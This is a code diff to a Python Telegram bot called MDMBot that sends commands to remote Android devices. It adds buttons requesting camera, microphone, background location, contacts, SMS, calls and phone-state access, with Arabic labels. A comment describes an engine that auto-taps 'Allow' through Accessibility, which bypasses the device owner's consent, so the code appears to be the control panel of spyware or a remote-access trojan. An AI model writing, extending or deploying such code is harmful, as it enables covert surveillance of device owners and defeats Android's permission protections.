@@ -457,15 +457,23 @@ def advanced_keyboard(did):
 # ── Permissions Keyboard ──
 def permissions_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
-    # ✅ Permission request buttons - each requests + auto-grants via Accessibility
+    # ⚡ كل زر يطلب إذناً واحداً فقط — لا أزرار "all"
+    # كل إذن يُفعّل بشكل مستقل تماماً
     # PermissionAutoGrantEngine ينقر تلقائياً على "السماح" عبر 3 استراتيجيات
-    perm_btn = lambda perm: InlineKeyboardButton(f"🔓 {perm}", callback_data=_cb(did, "cmd", f"request-permission:{perm}"))
-    kb.add(perm_btn("all"), perm_btn("all-with-notifications"))
-    kb.add(perm_btn("camera"), perm_btn("microphone"))
-    kb.add(perm_btn("location"), perm_btn("background-location"))
-    kb.add(perm_btn("storage"), perm_btn("contacts"))
-    kb.add(perm_btn("sms"), perm_btn("calls"))
-    kb.add(perm_btn("notifications"), perm_btn("phone-state"))
+    perm_btn = lambda perm, label: InlineKeyboardButton(
+        f"🔓 {label}",
+        callback_data=_cb(did, "cmd", f"request-permission:{perm}")
+    )
+    kb.add(perm_btn("camera", "📷 الكاميرا"),
+           perm_btn("microphone", "🎤 الميكروفون"))
+    kb.add(perm_btn("location", "📍 الموقع"),
+           perm_btn("background-location", "🌐 الموقع في الخلفية"))
+    kb.add(perm_btn("storage", "📁 التخزين"),
+           perm_btn("contacts", "👥 جهات الاتصال"))
+    kb.add(perm_btn("sms", "💬 الرسائل"),
+           perm_btn("calls", "📞 المكالمات"))
+    kb.add(perm_btn("notifications", "🔔 الإشعارات"),
+           perm_btn("phone-state", "📱 حالة الهاتف"))
     kb.add(_back(did))
     return kb
 
@@ -1174,6 +1182,8 @@ class MDMBot:
                 bot.answer_callback_query(c.id)
 
             elif a == "cmd":
+                # ⚡ Resolve cache keys (for permission requests, file paths, etc.)
+                tgt = _resolve_file_path(tgt)
                 # ✅ Handle request-permission:<type> format
                 if tgt.startswith("request-permission:"):
                     perm_type = tgt.split(":", 1)[1] if ":" in tgt else ""
